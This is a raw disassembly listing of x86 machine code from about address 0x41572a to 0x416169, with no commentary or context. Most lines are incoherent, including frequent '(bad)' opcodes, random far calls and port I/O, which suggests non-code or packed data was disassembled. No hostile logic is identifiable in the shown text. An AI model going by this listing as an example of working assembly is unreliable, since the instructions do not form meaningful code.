  41572a:	push   ss
  41572b:	(bad)  [esp+ebp*2]
  41572e:	push   ecx
  41572f:	(bad)  
  415730:	(bad)  
  415731:	in     al,0xec
  415733:	sar    BYTE PTR [esi+esi*8-0x6bc17e24],1
  41573a:	dec    edx
  41573b:	lods   al,BYTE PTR ds:[esi]
  41573c:	or     al,0x94
  41573e:	retf   0x196c
  415741:	aas    
  415742:	push   DWORD PTR [ebx+0x799d54b2]
  415748:	and    bl,BYTE PTR [eax+0x14e94682]
  41574e:	cmc    
  41574f:	xchg   edi,eax
  415750:	adc    dh,BYTE PTR [edx-0x19]
  415753:	mov    ah,0x20
  415755:	fxch   st(0)
  415757:	mov    dh,0xf9
  415759:	jmp    0x7aa14579
  41575e:	loopne 0x4157bc
  415760:	pop    ecx
  415761:	sar    DWORD PTR [esi+0xa],0x72
  415765:	add    DWORD PTR [ebp+0xf],esi
  415768:	adc    eax,0x3c32e614
  41576d:	(bad)  
  41576e:	jno    0x4156f2
  415770:	pop    esp
  415771:	sub    BYTE PTR [edi+esi*8-0x17],ch
  415775:	ds jp  0x41574c
  415778:	cmp    BYTE PTR [ebp-0x5bd705c9],bh
  41577e:	outs   dx,DWORD PTR ds:[esi]
  41577f:	ret    
  415780:	sub    ecx,DWORD PTR [eax-0x5bfaea9a]
  415786:	push   0x6196af70
  41578b:	(bad)  
  41578c:	dec    ebx
  41578d:	loopne 0x4157b8
  41578f:	cmp    al,0xb3
  415791:	cmp    edx,DWORD PTR [esp+eax*8-0x5d5e220f]
  415798:	or     ebp,esp
  41579a:	leave  
  41579b:	mov    cl,ah
  41579d:	lock leave 
  41579f:	aas    
  4157a0:	popf   
  4157a1:	test   BYTE PTR [edi-0x62],ah
  4157a4:	cli    
  4157a5:	mov    esi,ebp
  4157a7:	jno    0x4157c6
  4157a9:	xchg   DWORD PTR [eax+edi*1+0x6c612dad],ebp
  4157b0:	xor    BYTE PTR [eax-0x45],al
  4157b3:	sub    ah,BYTE PTR [ecx+0x0]
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx-0x6151961d]
  415823:	shl    BYTE PTR [edx+0xe064e1],1
  415829:	add    BYTE PTR [edi],al
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [esi],bl
  41582f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415830:	push   ss
  415831:	inc    esi
  415832:	ficomp WORD PTR [edx+0x5c]
  415835:	cli    
  415836:	int3   
  415837:	inc    edi
  415838:	xchg   esp,eax
  415839:	inc    edx
  41583a:	or     DWORD PTR [edi+0x65733496],esi
  415840:	add    ebp,DWORD PTR [esi]
  415842:	popf   
  415843:	dec    DWORD PTR [ebx-0x50b5d6d4]
  415849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41584a:	ins    BYTE PTR es:[edi],dx
  41584b:	lahf   
  41584c:	int    0x7d
  41584e:	inc    ebx
  41584f:	sar    BYTE PTR [ecx-0x3e],1
  415852:	outs   dx,DWORD PTR ds:[esi]
  415853:	shl    BYTE PTR [esi],cl
  415855:	jnp    0x4158b3
  415857:	(bad)  [ebx+0x74]
  41585a:	adc    dl,al
  41585c:	adc    BYTE PTR [ecx],ch
  41585e:	adc    esi,DWORD PTR [eax+0x67]
  415861:	sbb    eax,0x74694083
  415866:	call   0x801c:0x57ecc944
  41586d:	pop    ds
  41586e:	retf   
  41586f:	fstp   QWORD PTR [ecx+0xdb4166c]
  415875:	pop    esi
  415876:	push   esi
  415877:	cmp    BYTE PTR [esi+0x4b],cl
  41587a:	lods   eax,DWORD PTR ds:[esi]
  41587b:	inc    eax
  41587c:	(bad)  
  41587d:	jg     0x4158c5
  41587f:	mov    DWORD PTR gs:[eax+0x26],edi
  415883:	push   edx
  415884:	add    ecx,DWORD PTR [eax+0x2e2d949a]
  41588a:	inc    esi
  41588b:	ins    DWORD PTR es:[edi],dx
  41588c:	push   ebp
  41588d:	cmp    BYTE PTR [edi-0x73],dh
  415890:	(bad)  
  415891:	and    bh,dl
  415893:	mov    esp,0x3bb37b19
  415898:	dec    ecx
  415899:	popa   
  41589a:	or     dl,0x34
  41589d:	aaa    
  41589e:	and    al,0xc1
  4158a0:	dec    ecx
  4158a1:	inc    ecx
  4158a2:	push   ebp
  4158a3:	xor    DWORD PTR [ecx],esi
  4158a5:	xchg   edi,eax
  4158a7:	mov    al,0xa8
  4158a9:	bound  eax,QWORD PTR [edi+0x2]
  4158ac:	xor    DWORD PTR [edx-0x1131508f],eax
  4158b2:	mov    al,0x3f
  4158b4:	popa   
  4158b5:	sub    al,0xe5
  4158b7:	ins    DWORD PTR es:[edi],dx
  4158b8:	int3   
  4158b9:	mov    edi,0xcad9f50e
  4158be:	loop   0x415851
  4158c0:	push   0x11224e1d
  4158c5:	(bad)  [edx+ecx*4+0x2940a849]
  4158cc:	stos   BYTE PTR es:[edi],al
  4158cd:	retf   
  4158ce:	imul   esp
  4158d0:	mov    bl,0x3f
  4158d2:	cld    
  4158d3:	aam    0xad
  4158d5:	pop    edi
  4158d6:	sbb    dh,ch
  4158d8:	and    BYTE PTR [esi-0x412faeea],dl
  4158de:	mov    bh,0xd0
  4158e0:	arpl   WORD PTR [esi+0x5c643ca2],bp
  4158e6:	test   BYTE PTR [ebx-0x2cae0df5],0x5f
  4158ed:	jo     0x415958
  4158ef:	inc    edi
  4158f0:	popa   
  4158f1:	inc    esp
  4158f2:	in     al,dx
  4158f3:	adc    DWORD PTR [ebx],ebx
  4158f5:	scas   eax,DWORD PTR es:[edi]
  4158f6:	lock xor DWORD PTR [ecx-0x30],ecx
  4158fa:	retf   
  4158fb:	iret   
  4158fc:	lea    edx,[eax-0x143a51c2]
  415902:	sub    eax,0x1d6491c0
  415907:	or     bh,BYTE PTR [ebp-0x51]
  41590a:	outs   dx,DWORD PTR ds:[esi]
  41590b:	(bad)  
  41590c:	adc    cl,BYTE PTR [ebp+ebx*4+0x72]
  415910:	cli    
  415911:	lahf   
  415912:	cmp    ch,BYTE PTR [edi]
  415914:	hlt    
  415915:	adc    bh,0xd2
  415918:	mov    al,0x3b
  41591a:	xchg   edx,eax
  41591b:	popa   
  41591c:	rol    edx,cl
  41591e:	jne    0x415916
  415920:	and    BYTE PTR [eax],ah
  415922:	movlps xmm4,QWORD PTR [eax-0x14]
  415926:	xchg   edi,eax
  415927:	pop    ss
  415928:	das    
  415929:	push   cs
  41592a:	pop    es
  41592b:	sbb    esp,DWORD PTR [eax-0x7c]
  41592e:	sbb    edi,eax
  415930:	fcomp  DWORD PTR [esi+0xa]
  415933:	add    edi,ebp
	...
  415995:	add    BYTE PTR [ebp-0x78],al
  415998:	sub    al,0x77
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0xa0
  4159a3:	mov    ch,0xc0
  4159a5:	add    al,0x6b
  4159a7:	loope  0x4159a9
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [eax],dl
  4159af:	xor    al,0xc
  4159b1:	push   es
  4159b2:	fs popf 
  4159b4:	pusha  
  4159b5:	or     esi,DWORD PTR [ecx-0x39785316]
  4159bb:	and    BYTE PTR [edx+0x6e],dh
  4159be:	mov    ch,0x63
  4159c0:	loopne 0x4159a4
  4159c2:	iret   
  4159c3:	repz cmp ebx,0x20e75fc0
  4159ca:	dec    edi
  4159cb:	inc    edi
  4159cc:	add    eax,0x198a9f27
  4159d1:	and    DWORD PTR [ebx+0x47],0x69
  4159d5:	rcl    DWORD PTR [ecx+edi*4+0x7c],0xca
  4159da:	adc    al,bh
  4159dc:	lds    ebx,FWORD PTR [ebx+0x19]
  4159df:	mov    eax,ds:0xa34c8456
  4159e4:	int3   
  4159e5:	inc    ebp
  4159e6:	sbb    BYTE PTR [eax-0x23d892ea],dh
  4159ec:	push   cs
  4159ed:	lods   al,BYTE PTR ds:[esi]
  4159ee:	lods   eax,DWORD PTR ds:[esi]
  4159ef:	jg     0x4159ed
  4159f1:	mov    edi,0x8bb8dc69
  4159f6:	xor    DWORD PTR [ebx-0x64],edx
  4159f9:	call   DWORD PTR [esi]
  4159fb:	mov    cl,0xa8
  4159fd:	adc    eax,0xf83b34a3
  415a02:	mov    edx,0xeddeb642
  415a07:	push   esi
  415a08:	test   bl,al
  415a0a:	pop    esp
  415a0b:	push   edi
  415a0c:	jg     0x415a58
  415a0e:	pop    esi
  415a0f:	inc    esi
  415a10:	sbb    BYTE PTR [edi],0x60
  415a13:	test   al,0xf9
  415a15:	cdq    
  415a16:	retf   0x8fed
  415a19:	out    0x3d,eax
  415a1b:	dec    ecx
  415a1c:	push   ds
  415a1d:	cmp    edi,ecx
  415a1f:	inc    ebp
  415a20:	push   ebx
  415a21:	mov    fs,WORD PTR [ecx-0x7973beff]
  415a27:	imul   eax,DWORD PTR [ecx+0xfb2aeb1],0xffffffd7
  415a2e:	mov    ds:0xccb377d8,eax
  415a33:	dec    ebx
  415a34:	sbb    eax,0xe2278249
  415a39:	cdq    
  415a3a:	xchg   edi,eax
  415a3b:	js     0x415aa0
  415a3d:	sbb    al,0xc5
  415a3f:	dec    ecx
  415a40:	ret    
  415a41:	cli    
  415a42:	xchg   ebx,eax
  415a43:	icebp  
  415a44:	mov    DWORD PTR [edi],esp
  415a46:	mov    esi,0x1ca2f95
  415a4b:	(bad)  
  415a4c:	repz fidiv DWORD PTR [ebx-0x6e]
  415a50:	popf   
  415a51:	push   0x64
  415a53:	pop    ebp
  415a54:	loop   0x415a03
  415a56:	scas   al,BYTE PTR es:[edi]
  415a57:	adc    ebp,0xfb6f590c
  415a5d:	loopne 0x415a42
  415a5f:	enter  0x6398,0xc3
  415a63:	stos   DWORD PTR es:[edi],eax
  415a64:	or     DWORD PTR [ebp-0x52],0x18f72abd
  415a6b:	mov    edx,0xf8196daf
  415a70:	aas    
  415a71:	or     dl,BYTE PTR [esi-0x1e815926]
  415a77:	push   edx
  415a78:	call   0xb45ca13f
  415a7d:	add    DWORD PTR es:[edx+ecx*1+0x6c],esi
  415a82:	pop    esp
  415a83:	xchg   DWORD PTR [ecx],ebp
  415a85:	mov    ds:0xf3769645,al
  415a8a:	fdiv   QWORD PTR [edx]
  415a8c:	sti    
  415a8d:	adc    DWORD PTR [ebx-0x7a995742],edi
  415a93:	add    DWORD PTR [ecx+edx*4+0x26],ebx
  415a97:	add    BYTE PTR [ebp-0x72fcfb13],0xca
  415a9e:	or     al,0xfc
  415aa0:	cmp    al,0x76
  415aa2:	inc    ecx
  415aa3:	xchg   edi,eax
  415aa4:	loopne 0x415a40
  415aa6:	and    al,BYTE PTR [edx+0x27]
  415aa9:	mov    ebp,eax
  415aab:	adc    BYTE PTR [ebp+ebp*4+0xa3c4fdf],0xa1
  415ab3:	xchg   edx,eax
  415ab4:	std    
	...
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0x396c0323
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [edi+0x5090a54f],dh
  415b33:	inc    ebp
  415b34:	mov    esi,0x9e8de81c
  415b39:	data16 and al,0x2a
  415b3c:	pushaw 
  415b3e:	mov    eax,0xa5546494
  415b43:	mov    bl,0x6f
  415b45:	mov    edi,DWORD PTR [ecx+0x1f]
  415b48:	sub    BYTE PTR [edx+ebx*2],bh
  415b4b:	add    al,0x75
  415b4d:	aam    0xbe
  415b4f:	pushf  
  415b50:	xchg   ebp,eax
  415b51:	mov    ecx,eax
  415b53:	test   eax,0xae189749
  415b58:	xchg   edx,eax
  415b59:	dec    edx
  415b5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b5b:	adc    al,0x59
  415b5d:	mov    edi,0x3481681f
  415b62:	shl    esi,1
  415b64:	int    0x22
  415b66:	in     al,0xdc
  415b68:	mov    ds:0x31700350,eax
  415b6d:	or     ecx,DWORD PTR [ecx-0x61]
  415b70:	(bad)  
  415b72:	xchg   DWORD PTR [edi],esi
  415b74:	mov    ds:0x3a96c0b8,al
  415b79:	push   eax
  415b7a:	in     al,0x37
  415b7c:	sub    eax,0xcc7ab082
  415b81:	pop    ebp
  415b82:	arpl   WORD PTR [edx],bp
  415b84:	mov    edx,0x1c4c29da
  415b89:	or     BYTE PTR [esi],cl
  415b8b:	mov    al,0xe6
  415b8d:	xor    eax,0x4df3ca41
  415b92:	stos   DWORD PTR es:[edi],eax
  415b93:	arpl   WORD PTR [ecx],dx
  415b95:	mov    eax,ds:0x87de9895
  415b9a:	cmc    
  415b9b:	mov    ebx,0x6c7ff280
  415ba0:	and    ebx,DWORD PTR [ebx+0x76fa52d7]
  415ba6:	mov    eax,ds:0x4c8da6f2
  415bab:	popa   
  415bac:	mov    ds:0x107a3bdb,eax
  415bb1:	daa    
  415bb2:	xor    ah,BYTE PTR [ecx+0x7f]
  415bb5:	mov    ds:0xa75c2796,al
  415bba:	leave  
  415bbb:	sub    eax,0x72ad491d
  415bc0:	push   ecx
  415bc1:	das    
  415bc2:	rcl    BYTE PTR [esi+0x75094294],1
  415bc8:	ror    DWORD PTR [esi+0x645ec09a],cl
  415bce:	leave  
  415bcf:	cli    
  415bd0:	pushw  ss
  415bd2:	(bad)
  415bd6:	jmp    0x415c39
  415bd8:	test   eax,0xec1b4338
  415bdd:	stos   BYTE PTR es:[edi],al
  415bde:	xchg   edx,eax
  415bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415be0:	scas   al,BYTE PTR es:[edi]
  415be1:	pop    es
  415be2:	icebp  
  415be3:	sub    al,BYTE PTR [ebx+esi*1+0x65]
  415be7:	repz imul esp,DWORD PTR [ecx-0x15],0x439d019f
  415bef:	adc    BYTE PTR [esi-0x21],bh
  415bf2:	les    esp,FWORD PTR [edi]
  415bf4:	xor    al,0x78
  415bf6:	ins    BYTE PTR es:[edi],dx
  415bf7:	outs   dx,BYTE PTR ds:[esi]
  415bf8:	and    bl,BYTE PTR [eax+0x9095c5f]
  415bfe:	leave  
  415bff:	adc    ah,BYTE PTR [ebp+0x27]
  415c02:	jmp    0x5de50197
  415c07:	inc    esp
  415c08:	push   esp
  415c0a:	mov    ds:0x1050262,eax
  415c0f:	sbb    DWORD PTR [ebx+0x26639b9d],eax
  415c15:	cmp    bh,ah
  415c17:	mov    BYTE PTR [ecx+0x28],al
  415c1a:	jge    0x415c0a
  415c1c:	xchg   BYTE PTR [edi],bh
  415c1e:	leave  
  415c1f:	jae    0x415c8c
  415c21:	test   BYTE PTR [edx+0x10],cl
  415c24:	jne    0x415c41
  415c26:	sbb    al,0xab
  415c28:	sbb    al,0xf
  415c2a:	popa   
  415c2b:	aaa    
  415c2c:	and    eax,0xbc579afe
  415c31:	stc    
  415c32:	and    dh,al
  415c34:	add    eax,0x0
	...
  415c95:	add    BYTE PTR [edx],bh
  415c97:	adc    BYTE PTR [edi-0x444040c4],bh
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0xc2efe0f
  415ca5:	imul   edi,DWORD PTR [ecx-0x1d],0x1070000
  415cac:	add    BYTE PTR [eax],al
  415cae:	xor    DWORD PTR [eax-0x35],ecx
  415cb1:	out    dx,al
  415cb2:	push   0x8a7306d7
  415cb7:	jg     0x415c94
  415cb9:	call   0x4e70:0x361f95ed
  415cc0:	inc    edi
  415cc1:	fimul  WORD PTR [ebp+0xdf8447f]
  415cc7:	cmp    al,0x36
  415cc9:	xchg   BYTE PTR [edi+0x5f],bl
  415ccc:	jae    0x415c9d
  415cce:	repnz aas 
  415cd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cd1:	fst    QWORD PTR [edi+0x6]
  415cd4:	pop    ecx
  415cd5:	inc    ebx
  415cd6:	adc    ebp,esp
  415cd8:	cs adc dl,ch
  415cdb:	inc    ecx
  415cdc:	jmp    0x1bf:0xa62e989c
  415ce3:	mov    ah,0x97
  415ce5:	dec    ebp
  415ce6:	and    BYTE PTR [ebx],al
  415ce8:	mov    ds:0xe6f4d20f,al
  415ced:	cmp    DWORD PTR [ebp-0x5f094929],0xffffffa0
  415cf4:	cmp    bl,ch
  415cf6:	push   0xe73e3fb4
  415cfb:	dec    BYTE PTR [ebx]
  415cfd:	xchg   edi,eax
  415cfe:	loop   0x415d64
  415d00:	mov    ebx,0x71229daf
  415d05:	popf   
  415d06:	add    eax,0x349cfa3c
  415d0b:	int    0xc6
  415d0d:	xchg   edi,eax
  415d0e:	inc    ebx
  415d0f:	jne    0x415cac
  415d11:	adc    bl,BYTE PTR [edx-0x4c]
  415d14:	push   ebp
  415d15:	cli    
  415d16:	jo     0x415d3a
  415d18:	mov    ch,dh
  415d1a:	mov    dl,0x1c
  415d1c:	psubusb mm3,QWORD PTR [eax]
  415d1f:	push   0x76733e56
  415d24:	mov    cl,0x53
  415d26:	dec    ebp
  415d27:	dec    ecx
  415d28:	addr16 add dh,bh
  415d2b:	aaa    
  415d2c:	inc    edx
  415d2d:	mov    ch,0xb6
  415d2f:	das    
  415d30:	add    al,0xc
  415d32:	leave  
  415d33:	adc    DWORD PTR [eax+0x29],ebp
  415d36:	xor    bl,BYTE PTR [edi-0x64]
  415d39:	add    al,0xdf
  415d3b:	cmp    al,0xef
  415d3d:	in     eax,0x15
  415d3f:	(bad)  
  415d40:	push   cs
  415d41:	push   ebp
  415d42:	pusha  
  415d43:	int3   
  415d44:	cmp    edi,edx
  415d46:	faddp  st(5),st
  415d48:	jl     0x415d7a
  415d4a:	jle    0x415d96
  415d4c:	test   al,0x25
  415d4e:	lea    cx,[bx-0x52]
  415d53:	pop    ecx
  415d54:	mov    edx,0x98207d7d
  415d59:	fdivr  DWORD PTR [esi+0x73]
  415d5c:	mov    BYTE PTR [edi],bh
  415d5e:	or     ah,al
  415d60:	dec    eax
  415d61:	cs jmp 0x415d21
  415d64:	dec    ebx
  415d65:	out    dx,eax
  415d66:	icebp  
  415d67:	dec    esp
  415d68:	or     al,0x50
  415d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d6b:	pop    esp
  415d6c:	call   0x4a6a:0xe94efae0
  415d73:	xchg   ebp,eax
  415d74:	sub    esp,ecx
  415d76:	mov    edi,0x7bc09275
  415d7b:	inc    esp
  415d7c:	cdq    
  415d7d:	xor    DWORD PTR [edi-0x799c0391],ebp
  415d83:	std    
  415d84:	mov    esi,0x4b25065e
  415d89:	ror    BYTE PTR [eax-0x190016ab],cl
  415d8f:	push   ds
  415d90:	mov    DWORD PTR [ebx+0x5a],ecx
  415d93:	fisub  WORD PTR [edi]
  415d95:	cmp    DWORD PTR [esi],edi
  415d97:	or     DWORD PTR [edx+0x55b7850a],esi
  415d9d:	ficomp WORD PTR [esi-0x38]
  415da1:	or     BYTE PTR [ebp+0x6e2706e2],al
  415da7:	jo     0x415d34
  415da9:	or     BYTE PTR [ebx],dh
  415dab:	sbb    al,0xcc
  415dad:	mov    ch,BYTE PTR [edx+0x19720109]
  415db3:	pop    edi
  415db4:	test   BYTE PTR [eax],al
	...
  415e16:	out    dx,al
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x68855606
  415e24:	sbb    BYTE PTR [ebp+0xe480],al
  415e2a:	pop    es
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [edx-0x5e938362],dl
  415e33:	add    BYTE PTR [ebx+0x65e323a2],0x14
  415e3a:	push   cs
  415e3b:	mov    eax,0x3d2c03d6
  415e40:	xlat   BYTE PTR ds:[ebx]
  415e41:	arpl   dx,si
  415e43:	or     dh,bl
  415e45:	adc    ch,BYTE PTR [eax-0x1688b5db]
  415e4b:	pop    edx
  415e4c:	std    
  415e4d:	test   bh,0x23
  415e50:	mov    edx,0x3193f945
  415e55:	mov    bl,0xda
  415e57:	add    BYTE PTR [ebx-0x483b7841],bh
  415e5d:	retf   0xe5c9
  415e60:	jl     0x415eb5
  415e62:	iret   
  415e63:	aas    
  415e64:	and    al,0x35
  415e66:	pop    esp
  415e67:	sub    BYTE PTR [eax+0xe],cl
  415e6a:	fdivr  st(6),st
  415e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e6d:	add    eax,DWORD PTR [ebx-0x5a]
  415e70:	dec    DWORD PTR [esi]
  415e72:	pop    edi
  415e73:	ficomp DWORD PTR [esi+edx*4+0x7f]
  415e77:	in     eax,0x76
  415e79:	pushf  
  415e7a:	xor    ah,BYTE PTR [ebx-0x3a]
  415e7d:	xchg   esi,eax
  415e7e:	push   edi
  415e7f:	mov    ds:0x739d4a0c,eax
  415e84:	data16 int3 
  415e86:	push   edx
  415e87:	xor    ah,bh
  415e89:	in     al,dx
  415e8a:	fidiv  DWORD PTR [eax+0x3e]
  415e8d:	stos   BYTE PTR es:[edi],al
  415e8e:	ja     0x415e14
  415e90:	data16 or BYTE PTR [ecx+0x59292157],dl
  415e97:	mov    ecx,0x9dba046f
  415e9c:	fiadd  WORD PTR [eax+0x9fa85e1]
  415ea2:	fld    QWORD PTR [eax+0x2b]
  415ea5:	cmp    cl,BYTE PTR [ecx-0x7b1308ec]
  415eab:	and    al,ah
  415ead:	(bad)  
  415eae:	retf   0xd0bd
  415eb1:	cmp    bl,BYTE PTR [esi]
  415eb3:	stc    
  415eb4:	loope  0x415e62
  415eb6:	jnp    0x415f0a
  415eb8:	test   bl,0x47
  415ebb:	adc    eax,0x4ce0ed19
  415ec0:	cmp    al,0x1d
  415ec2:	ret    0x8f8
  415ec5:	jle    0x415efc
  415ec7:	nop
  415ec8:	lea    eax,[ecx+0x49]
  415ecb:	mov    DWORD PTR [esi-0x33],ebp
  415ece:	or     DWORD PTR fs:[edx],ebp
  415ed1:	mov    bh,0x24
  415ed3:	fstp   TBYTE PTR [eax+0x38]
  415ed6:	ds pop es
  415ed8:	icebp  
  415ed9:	cli    
  415eda:	scas   eax,DWORD PTR es:[edi]
  415edb:	dec    esp
  415edc:	shl    DWORD PTR [bx+di-0x2f95],cl
  415ee1:	sub    eax,0xce6686c0
  415ee6:	cld    
  415ee7:	xor    al,0xd1
  415ee9:	stos   DWORD PTR es:[edi],eax
  415eea:	sbb    edi,DWORD PTR [esi-0x27]
  415eed:	pop    ebx
  415eee:	pop    ebp
  415eef:	pop    eax
  415ef0:	jmp    0x3733f60d
  415ef5:	ret    0xa986
  415ef8:	pusha  
  415ef9:	push   ss
  415efa:	dec    ebx
  415efb:	add    DWORD PTR es:[edx+0x56],esi
  415eff:	cmp    DWORD PTR [esi],edx
  415f01:	out    dx,al
  415f02:	pop    esi
  415f03:	xlat   BYTE PTR ds:[ebx]
  415f04:	retf   0x271e
  415f07:	jae    0x415ef4
  415f09:	ins    DWORD PTR es:[edi],dx
  415f0a:	iret   
  415f0b:	mov    al,0x64
  415f0d:	xchg   BYTE PTR [ebx-0x6e527428],bh
  415f13:	loope  0x415eaf
  415f15:	sbb    ah,0x22
  415f18:	or     bl,0x13
  415f1b:	(bad)  
  415f1c:	xcrypt-ecb (bad)
  415f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f1e:	or     edx,DWORD PTR [edx-0x4acb9484]
  415f24:	push   ecx
  415f25:	fadd   QWORD PTR ds:0xc28ff2d0
  415f2b:	sbb    ebx,DWORD PTR [ecx+0x3]
  415f2e:	mov    ebp,0xf7e9fce5
  415f33:	imul   esi,DWORD PTR [eax+0x0],0x0
	...
  415f93:	add    BYTE PTR [eax],al
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	sbb    ebp,ebx
  415fa4:	pop    esi
  415fa5:	pop    DWORD PTR [edi+0x70000e5]
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [eax],ah
  415faf:	fst    QWORD PTR [esi]
  415fb1:	or     eax,0xfdae3664
  415fb6:	popa   
  415fb7:	pop    edi
  415fb8:	scas   eax,DWORD PTR es:[edi]
  415fb9:	or     DWORD PTR [edi],edx
  415fbb:	shl    BYTE PTR [ecx],1
  415fbd:	cmp    al,0x65
  415fbf:	jb     0x415f83
  415fc1:	inc    esp
  415fc2:	inc    edi
  415fc3:	pop    ecx
  415fc4:	(bad)  
  415fc5:	xor    BYTE PTR [edx+0x71],bl
  415fc8:	je     0x416038
  415fca:	ins    BYTE PTR es:[edi],dx
  415fcb:	mov    ds:0xb01eb624,al
  415fd0:	jle    0x415fb9
  415fd2:	mov    eax,ds:0x788265a
  415fd7:	inc    ebx
  415fd8:	aaa    
  415fd9:	add    eax,0xfbe5018a
  415fde:	and    edx,DWORD PTR [edi]
  415fe0:	popa   
  415fe1:	mov    al,ds:0x7c732446
  415fe6:	popa   
  415fe7:	js     0x41603d
  415fe9:	dec    ebx
  415fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415feb:	mov    cl,BYTE PTR [esi+0x5986de5]
  415ff1:	retf   0x34b4
  415ff4:	pop    es
  415ff5:	lods   eax,DWORD PTR ds:[esi]
  415ff6:	pop    ds
  415ff7:	and    esp,ecx
  415ff9:	ins    BYTE PTR es:[edi],dx
  415ffa:	push   cs
  415ffb:	or     cl,ah
  415ffd:	mov    dl,0xdf
  415fff:	std    
  416000:	dec    ecx
  416001:	imul   ebx,DWORD PTR [esi+0x278933c2],0xffffff9c
  416008:	adc    cl,BYTE PTR [ebx]
  41600a:	jg     0x415faf
  41600c:	or     ecx,DWORD PTR [ebx+0x1b]
  41600f:	(bad)  
  416011:	jbe    0x415ff7
  416013:	retf   
  416014:	xor    DWORD PTR [esi],eax
  416016:	out    0xe8,eax
  416018:	cmc    
  416019:	mov    BYTE PTR ds:0xaf11ea2b,ch
  41601f:	sub    DWORD PTR [eax-0x66],edx
  416022:	and    BYTE PTR [esi],ah
  416024:	push   ds
  416025:	push   edx
  416026:	(bad)  
  416028:	ret    0x49c1
  41602b:	or     bh,0x55
  41602e:	and    BYTE PTR [edi+0x26de1749],dl
  416034:	std    
  416035:	inc    esp
  416036:	out    0xda,al
  416038:	inc    ebp
  416039:	add    ch,BYTE PTR [edi-0x4f781ea1]
  41603f:	cmp    DWORD PTR ds:0xe1f53262,edx
  416045:	cmp    edx,DWORD PTR [eax]
  416047:	mov    ch,0x6a
  416049:	leave  
  41604a:	xor    ch,BYTE PTR ds:0xf0029425
  416050:	xlat   BYTE PTR ds:[ebx]
  416051:	dec    esp
  416052:	mov    esp,DWORD PTR [eax+0x57df36cd]
  416058:	mov    esp,0x43437b28
  41605d:	addps  xmm3,xmm0
  416060:	or     BYTE PTR [edi+0x39],cl
  416063:	push   ds
  416064:	out    0x37,eax
  416066:	aam    0xb9
  416068:	and    BYTE PTR [edx],dh
  41606a:	add    edi,DWORD PTR [edi]
  41606c:	inc    eax
  41606d:	or     al,0x9e
  41606f:	xor    ebp,esp
  416071:	call   FWORD PTR [ebp+0x78]
  416074:	mov    ebp,0x7c7d81b2
  416079:	out    0x75,al
  41607b:	pusha  
  41607c:	add    eax,0xce27bdd5
  416081:	and    DWORD PTR [eax-0x4bb582b1],edx
  416087:	jp     0x416101
  416089:	add    esp,DWORD PTR [edi]
  41608b:	cdq    
  41608c:	xchg   esp,eax
  41608d:	jmp    0x4160bb
  41608f:	cmp    ebx,esi
  416091:	in     al,0xba
  416093:	icebp  
  416094:	es ret 0x9942
  416098:	sahf   
  416099:	fldpi  
  41609b:	loope  0x416113
  41609d:	cld    
  41609e:	(bad)  
  41609f:	dec    ebx
  4160a0:	lahf   
  4160a1:	je     0x4160d3
  4160a3:	inc    ebp
  4160a4:	cs and eax,0xf3645af6
  4160aa:	out    0x75,al
  4160ac:	sbb    al,BYTE PTR ds:0x90ff8783
  4160b2:	jno    0x41608f
  4160b4:	je     0x4160b6
	...
  416116:	and    cl,ch
  416118:	cmp    ebx,esi
  41611a:	sti    
  41611b:	fsubrp st(5),st
  41611d:	jmp    DWORD PTR [edx]
  41611f:	fwait
  416120:	xchg   DWORD PTR [ecx],edx
  416122:	addr16 iret 
  416124:	out    0x7f,eax
  416126:	mov    fs,esi
  416128:	add    BYTE PTR [eax],al
  41612a:	pop    es
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [esi],dl
  41612f:	push   cs
  416130:	shr    DWORD PTR [eax],cl
  416132:	ins    DWORD PTR es:[edi],dx
  416133:	push   esp
  416134:	cmp    eax,0x267fc7ff
  416139:	mov    eax,0xd2709de8
  41613e:	sub    eax,0x639332ad
  416143:	retf   
  416144:	xor    esp,DWORD PTR [ebx+0x1e]
  416147:	out    dx,al
  416148:	pop    es
  416149:	xor    al,0x6
  41614b:	jno    0x4161a4
  41614d:	mov    bh,dl
  41614f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416150:	pop    ds
  416151:	and    DWORD PTR [eax],0x96744dbd
  416157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416158:	ret    
  416159:	mov    ah,0xb
  41615b:	fisub  WORD PTR [ebp+esi*2-0x66]
  41615f:	neg    BYTE PTR [ebx+0x28]
  416162:	xchg   ebx,ebp
  416164:	push   esp
  416165:	nop
  416166:	in     eax,0x61
  416168:	sahf   
  416169:	mov    edx,0x904db394
